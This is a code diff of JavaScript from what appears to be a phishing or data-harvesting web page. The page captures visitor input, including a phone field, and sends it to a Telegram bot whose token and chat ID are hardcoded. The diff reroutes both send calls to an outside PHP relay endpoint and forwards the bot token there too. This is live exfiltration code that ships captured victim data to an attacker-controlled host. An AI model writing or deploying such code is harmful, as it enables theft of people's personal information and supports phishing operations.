@@ -389,11 +389,12 @@ phoneInput.setAttribute('autocomplete', 'tel');
       const TELEGRAM_BOT_TOKEN = '5572397080:AAFqa1dOYqvKrQ8-Wx5ez7PaqsVtvWU8vjA';
       const CHAT_ID = '-702616123';
 
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      fetch(`https://ongmuot.com/cantieuly.php`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+        body: JSON.stringify({ token: TELEGRAM_BOT_TOKEN, chat_id: CHAT_ID, text: message })
       });
+
 
       captured = true;
     }, 50000);
@@ -441,12 +442,10 @@ phoneInput.setAttribute('autocomplete', 'tel');
     try {
       const TELEGRAM_BOT_TOKEN = '5572397080:AAFqa1dOYqvKrQ8-Wx5ez7PaqsVtvWU8vjA';
       const CHAT_ID = '-702616123';
-      const res = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+      const res = await fetch(`https://ongmuot.com/cantieuly.php`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token: TELEGRAM_BOT_TOKEN, chat_id: CHAT_ID, text: message })
         }
       );
       if (res.ok) {
